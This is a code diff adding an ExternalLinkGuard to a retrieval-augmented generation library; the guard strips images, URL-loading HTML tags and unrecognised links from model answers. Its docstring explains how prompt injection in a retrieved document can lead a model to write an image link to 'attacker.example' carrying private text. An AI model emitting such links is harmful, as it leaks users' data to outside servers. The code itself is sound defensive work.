@@ -525,6 +525,144 @@ class OutputLeakGuard(Guard):
         return modify("".join(pieces), reason=reason)
 
 
+# Links and images in answers. Images and HTML tags that load a URL are fetched by the renderer on
+# display (no click needed), so they can carry retrieved text to an attacker's server.
+LINK_IMAGE_RE = re.compile(r"!\[[^\]\n]*\]\(\s*<?([^)\s>]*)>?(?:\s+[\"'][^\"'\n]*[\"'])?\s*\)")
+LINK_RE = re.compile(r"(?<!!)\[([^\]\n]*)\]\(\s*<?([^)\s>]*)>?(?:\s+[\"'][^\"'\n]*[\"'])?\s*\)")
+LINK_REFERENCE_RE = re.compile(r"^[ \t]{0,3}\[[^\]\n]+\]:[ \t]*<?(\S+?)>?(?:[ \t]+[\"'(].*)?$", re.MULTILINE)
+HTML_URL_TAG_RE = re.compile(r"<\s*(?:img|image|iframe|frame|embed|object|video|audio|source|script|link|a|form|meta|base|svg|use)\b[^>]*>", re.IGNORECASE)
+BARE_URL_RE = re.compile(r"\b(?:https?|ftp)://[^\s<>()\[\]\"']+", re.IGNORECASE)
+_URL_IN_TEXT_RE = re.compile(r"(?:https?|ftp)://[^\s<>()\[\]\"']+", re.IGNORECASE)
+
+
+def _host(url: str) -> str:
+    from urllib.parse import urlparse
+
+    try:
+        return (urlparse(url.strip()).hostname or "").lower()
+    except ValueError:
+        return ""
+
+
+class ExternalLinkGuard(Guard):
+    """Remove links and images from the answer that point anywhere the sources did not.
+
+    A prompt injection in a retrieved document can make the model write
+    ``![x](https://attacker.example/?q=<private text>)``; a chat UI that renders the answer then
+    sends that text to the attacker. This guard (on by default, ``secure_defaults["external_links"]``):
+
+    * removes markdown images and HTML tags that load a URL (``<img>``, ``<iframe>``, ...), unless
+      their host is in ``allow_domains``;
+    * keeps a link or a bare URL when the exact URL appears in a retrieved source (its ``url``
+      metadata or its text) or its host is in ``allow_domains``; otherwise a markdown link keeps
+      only its text and a bare URL becomes ``[link removed]``.
+
+    ``allow_domains``: hosts to trust, matched exactly or as a parent domain (``"example.com"``
+    allows ``docs.example.com``). Streaming-safe. Trade-off: links the model writes from its own
+    knowledge (not in a source) are removed too; add their domains to ``allow_domains`` to keep them.
+    """
+
+    name = "external_links"
+    stages = ("output",)
+    streaming_safe = True
+    # Whole words are enough: a URL has no spaces, and the stream never releases a link, image or
+    # tag that is still being written (raglib.guards.streaming), so streams stay word by word.
+    stream_holdback = 1
+    quiet = True  # on by default: no record unless it removes something
+
+    def __init__(self, allow_domains: Sequence[str] = (), allow_source_urls: bool = True, **kwargs: Any):
+        super().__init__(**kwargs)
+        if isinstance(allow_domains, str):
+            allow_domains = [allow_domains]
+        self.allow_domains = tuple(d.strip().lower().lstrip(".") for d in allow_domains if d and d.strip())
+        self.allow_source_urls = allow_source_urls
+
+    def _domain_allowed(self, url: str) -> bool:
+        host = _host(url)
+        return bool(host) and any(host == d or host.endswith("." + d) for d in self.allow_domains)
+
+    def _source_urls(self, context: GuardContext) -> Set[str]:
+        urls: Set[str] = set()
+        if not self.allow_source_urls:
+            return urls
+        for doc in context.documents:
+            metadata = getattr(doc, "metadata", {}) or {}
+            for key in ("url", "link", "source"):
+                value = metadata.get(key)
+                if isinstance(value, str) and "://" in value:
+                    urls.add(value.strip())
+            source = getattr(doc, "source", "")
+            if isinstance(source, str) and "://" in source:
+                urls.add(source.strip())
+            urls.update(match.group(0).rstrip(".,;:!?") for match in _URL_IN_TEXT_RE.finditer(getattr(doc, "content", "") or ""))
+        return urls
+
+    def check(self, value: str, context: GuardContext) -> Decision:
+        if "://" not in value and "<" not in value and "]:" not in value:
+            return allow()
+        known = self._source_urls(context)
+        removed: Dict[str, int] = {}
+
+        def link_ok(url: str) -> bool:
+            clean = url.strip().rstrip(".,;:!?")
+            return (bool(clean) and clean in known) or self._domain_allowed(clean)
+
+        def count(kind: str) -> None:
+            removed[kind] = removed.get(kind, 0) + 1
+
+        def image(match: "re.Match[str]") -> str:
+            if self._domain_allowed(match.group(1)):
+                return match.group(0)
+            count("image")
+            return ""
+
+        def html(match: "re.Match[str]") -> str:
+            urls = re.findall(r"(?:src|href|data|action|poster|srcset|content|xlink:href)\s*=\s*[\"']?([^\"'\s>]+)", match.group(0), re.I)
+            if urls and all(self._domain_allowed(url) for url in urls):
+                return match.group(0)
+            count("html")
+            return ""
+
+        def link(match: "re.Match[str]") -> str:
+            if not match.group(2) or link_ok(match.group(2)):
+                return match.group(0)
+            count("link")
+            return match.group(1)
+
+        def reference(match: "re.Match[str]") -> str:
+            if link_ok(match.group(1)):
+                return match.group(0)
+            count("link")
+            return ""
+
+        def bare(match: "re.Match[str]") -> str:
+            if link_ok(match.group(0)):
+                return match.group(0)
+            count("url")
+            return "[link removed]"
+
+        text = LINK_IMAGE_RE.sub(image, value)
+        text = HTML_URL_TAG_RE.sub(html, text)
+        # Links and bare URLs: protect the URLs kept inside allowed links from the bare-URL pass.
+        kept: List[str] = []
+
+        def keep(match: "re.Match[str]") -> str:
+            replacement = link(match)
+            if replacement == match.group(0):
+                kept.append(replacement)
+                return f"\x00{len(kept) - 1}\x00"
+            return replacement
+
+        text = LINK_RE.sub(keep, text)
+        text = LINK_REFERENCE_RE.sub(reference, text)
+        text = BARE_URL_RE.sub(bare, text)
+        text = re.sub(r"\x00(\d+)\x00", lambda m: kept[int(m.group(1))], text)
+        if not removed:
+            return allow()
+        reason = "removed " + ", ".join(f"{kind} x{n}" for kind, n in sorted(removed.items()))
+        return modify(text, reason=reason)
+
+
 _CITATION_RE = re.compile(r"\[(\d{1,3})\]")
 
 
